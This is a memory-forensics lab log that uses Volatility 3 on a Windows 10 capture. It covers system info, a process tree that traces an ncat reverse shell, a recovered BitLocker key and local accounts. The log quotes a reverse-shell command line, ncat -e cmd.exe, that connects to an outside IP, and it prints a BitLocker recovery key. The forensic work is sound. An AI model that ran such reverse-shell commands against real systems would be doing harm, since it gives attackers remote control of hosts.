# Volatility 3 — RAM Analysis Command Log

**Target:** `WindowsTGTmemdump.mem`, a memory capture from host `WINCLIENTTGT` (Windows 10 Enterprise, Intel x64).
**Tooling:** Volatility 3 Framework 2.0.2, invoked from PowerShell.

---

## 1. Machine identification — `windows.info`

```powershell
python.exe .\volatility3\vol.py -f .\WindowsTGTmemdump.mem windows.info > .\windowsinfo.txt
type .\windowsinfo.txt | more
```

Output (key fields):

```
KeNumberProcessors   2
SystemTime           2024-02-21 18:34:33
NtProductType        NtProductWinNt
NtMajorVersion       10
PE MajorOperatingSystemVersion  10
```

Establishes the memory image is from a Windows 10 machine, 2 logical processors, with a system clock reading of `2024-02-21 18:34:33` at capture-adjacent time.

## 2. Process tree — `windows.pstree`

**TODO (Tanner):** the exact `vol.py ... windows.pstree` invocation was not captured in the lab writeup — only its output was. Confirm the plugin name before treating this as a literal reproduction (the output's indentation style and column set — `PID, PPID, ImageFileName, Offset(V), Threads, Handles, SessionId, Wow64, CreateTime, ExitTime` — match `windows.pstree`, but that's this analyst's inference from the output format, not a captured command line).

Relevant rows from the process tree (screenshot: [`../Images/process-tree-ncat-reverse-shell.png`](../Images/process-tree-ncat-reverse-shell.png)):

```
PID   PPID  ImageFileName  ...  CreateTime
6888  6040  cmd.exe             2024-02-21 17:52:23
6764  6888  conhost.exe         2024-02-21 17:52:23
1772  6888  ncat.exe            2024-02-21 18:01:18
8240  1772  cmd.exe             2024-02-21 18:01:19
```

**Corrected from the source lab writeup.** The original lab writeup's answer states *"The PID is 6888. `ncat.exe -nv 10.11.8.212 443 -e cmd.exe` was used..."* — attributing that PID to `ncat.exe` itself. That's wrong: verified directly against the process-tree screenshot ([`../Images/process-tree-ncat-reverse-shell.png`](../Images/process-tree-ncat-reverse-shell.png), zoomed on the four relevant rows), PID `6888` is a `cmd.exe` (parent shell, spawned `17:52:23`), and the process actually named `ncat.exe` is PID `1772` — a child of `6888`, created `18:01:18`. `ncat.exe` in turn spawned PID `8240` (`cmd.exe`, created one second later at `18:01:19`), which is the `-e cmd.exe` reverse shell itself. The chain is: `cmd.exe (6888)` → `ncat.exe (1772)` → `cmd.exe (8240)`. The README's Findings section cites the corrected PIDs.

## 3. Recovered BitLocker recovery-key file

The recovery key artifact was already extracted to a `DataSectionObject` dump file before this step (extraction command not captured in the writeup — likely `windows.dumpfiles`; **TODO: confirm**). It was then read directly:

```powershell
type '.\file.0xd08c6d89f7e0.0xd08c6d816050.DataSectionObject.BitLocker Recovery Key 4E3D7844-CC56-427E-89A1-DCF265F60C16.TXT.dat'
```

Output: recovery key `064108-538450-057409-468864-438911-291181-111815-356125` for identifier `4E3D7844-CC56-427E-89A1-DCF265F60C16`.

## 4. Local user accounts (SAM)

Output resembling RegRipper's `samparse` plugin format was reviewed (User Information / Group Membership Information blocks), listing `Administrator [500]`, `Guest [501]`, `Default Account [503]`, and `WDAGUtilityAccount [504]`. `Administrator`'s last recorded logon: `Wed Feb 21 17:08:07 2024 Z`.

**TODO (Tanner):** confirm whether this was produced by a Volatility 3 plugin (e.g. `windows.registry.hivelist` + hive dump + offline RegRipper `samparse`) or something else — the writeup captured the output but not the extraction step.

## Notes

- All timestamps as reported by tooling are UTC unless noted.
- This memory image is coursework-lab evidence (see [`../README.md`](../README.md) for scope/environment); it was not collected from a production incident.
